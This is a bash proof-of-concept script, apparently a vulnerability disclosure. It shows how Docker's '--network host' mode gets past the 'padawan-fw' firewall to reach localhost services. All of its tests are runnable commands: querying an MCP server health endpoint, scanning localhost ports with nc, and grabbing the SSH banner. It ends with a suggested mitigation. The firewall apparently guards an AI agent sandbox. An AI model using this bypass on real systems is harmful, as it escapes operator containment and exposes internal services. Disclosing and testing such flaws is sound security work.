#!/bin/bash
# Proof of Concept: Docker Host Network Bypass
# Description: Demonstrates how Docker containers with --network host 
#              can bypass padawan-fw firewall and access localhost services
# Severity: HIGH
# Date: 2026-02-14

echo "=================================================="
echo "PoC: Docker Host Network Firewall Bypass"
echo "=================================================="
echo ""

echo "[*] Testing Docker host network bypass..."
echo ""

# Test 1: Access MCP health endpoint
echo "[+] Test 1: Accessing MCP server health endpoint..."
echo "    Command: docker run --rm --network host alpine wget -q -O- http://127.0.0.1:2301/health"
docker run --rm --network host alpine sh -c "
  wget -q -O- http://127.0.0.1:2301/health 2>&1
"
echo ""

# Test 2: Port scan localhost
echo "[+] Test 2: Scanning localhost ports..."
echo "    Command: docker run --rm --network host alpine nc -zv 127.0.0.1 <ports>"
docker run --rm --network host alpine sh -c "
  for port in 22 80 443 2301 3000 5000 8080; do
    timeout 1 nc -zv 127.0.0.1 \$port 2>&1 | grep -v 'timed out'
  done
"
echo ""

# Test 3: SSH banner grab
echo "[+] Test 3: Grabbing SSH banner..."
echo "    Command: docker run --rm --network host alpine nc 127.0.0.1 22"
docker run --rm --network host alpine sh -c "
  timeout 2 nc 127.0.0.1 22 2>&1 | head -3
"
echo ""

# Test 4: Compare with standard container (should be blocked)
echo "[+] Test 4: Comparison with standard container (should timeout)..."
echo "    Command: docker run --rm alpine wget -T 3 -O- http://127.0.0.1:2301/health"
timeout 5 docker run --rm alpine sh -c "
  wget -T 3 -O- http://127.0.0.1:2301/health 2>&1 || echo 'BLOCKED (expected behavior)'
" | head -5
echo ""

echo "=================================================="
echo "PoC Complete!"
echo "=================================================="
echo ""
echo "Summary:"
echo "- Host network mode: Can access localhost services ✓"
echo "- Standard mode: Blocked by firewall ✓"
echo "- Vulnerability confirmed: CRITICAL"
echo ""
echo "Impact: Firewall bypass, access to internal services"
echo "Mitigation: Block --network host flag in Docker commands"
